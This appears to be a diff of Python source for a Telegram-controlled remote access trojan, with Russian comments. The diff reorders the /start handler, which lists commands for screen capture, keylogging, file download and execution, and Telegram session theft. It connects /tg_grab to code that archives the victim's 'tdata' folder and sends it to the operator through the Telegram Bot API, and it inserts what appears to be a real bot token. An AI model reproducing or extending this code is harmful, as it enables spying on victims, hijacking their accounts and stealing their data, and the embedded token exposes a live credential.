@@ -268,6 +268,23 @@ def destroy_all_traces(message):
         error_message = f"ОШИБКА: {e}"
         bot.send_message(chat_id, error_message)
 @bot.message_handler(commands=['start'])
+def start(message):
+    chat_id = message.chat.id
+    markup = types.ReplyKeyboardMarkup(row_width=1)
+    itembtn1 = types.KeyboardButton('/capture_pc')
+    itembtn2 = types.KeyboardButton('/keylogs')
+    itembtn3 = types.KeyboardButton('/pc_info')
+    itembtn4 = types.KeyboardButton('/msg_box')
+    itembtn5 = types.KeyboardButton('/ip_info')
+    itembtn6 = types.KeyboardButton('/download_file')
+    itembtn7 = types.KeyboardButton('/list_dir')
+    itembtn8 = types.KeyboardButton('/run_file')
+    itembtn9 = types.KeyboardButton('/tg_grab')
+    itembtn10 = types.KeyboardButton('/url')
+    itembtn11 = types.KeyboardButton('/code')
+    markup.add(itembtn1, itembtn2, itembtn3, itembtn4, itembtn5, itembtn6, itembtn7, itembtn8, itembtn9, itembtn10, itembtn11)
+    bot.send_message(chat_id, "Выберите команду:", reply_markup=markup)
+@bot.message_handler(commands=['tg_grab'])
 def handle_tg_grab_command(message):
     def send_message_to_group(chat_id):
         system_name = platform.system()  # Определение системного имени
@@ -296,30 +313,8 @@ def handle_tg_grab_command(message):
             print("Папка 'tdata' не найдена.")
     
     chat_id = message.chat.id
-    telegram_bot_token = "<your_telegram_bot_token>"  # Замените на ваш токен
+    telegram_bot_token = "7056495787:AAHkVcBQcjIMBtfoDcSCXhc8MfYQQ9MUzw8"  # Замените на ваш токен
     archive_and_send2()
-def start(message):
-    chat_id = message.chat.id
-    markup = types.ReplyKeyboardMarkup(row_width=1)
-    itembtn1 = types.KeyboardButton('/capture_pc')
-    itembtn2 = types.KeyboardButton('/keylogs')
-    itembtn3 = types.KeyboardButton('/pc_info')
-    itembtn4 = types.KeyboardButton('/msg_box')
-    itembtn5 = types.KeyboardButton('/ip_info')
-    itembtn6 = types.KeyboardButton('/download_file')
-    itembtn7 = types.KeyboardButton('/list_dir')
-    itembtn8 = types.KeyboardButton('/run_file')
-    itembtn9 = types.KeyboardButton('/tg_grab')
-    itembtn10 = types.KeyboardButton('/url')
-    itembtn11 = types.KeyboardButton('/code')
-    markup.add(itembtn1, itembtn2, itembtn3, itembtn4, itembtn5, itembtn6, itembtn7, itembtn8, itembtn9, itembtn10, itembtn11)
-    bot.send_message(chat_id, "Выберите команду:", reply_markup=markup)
-@bot.message_handler(commands=['tg_grab'])
-def send_message_to_group(chat_id):
-    system_name = platform.system()  # Определение системного имени
-    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
-    data = {'chat_id': chat_id, 'text': f"System Name: {system_name}\n"}
-    response = requests.post(url, data=data)
 def send_file_to_telegram(file_path, file_name):
     url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
     files = {'document': (file_name, open(file_path, 'rb'))}
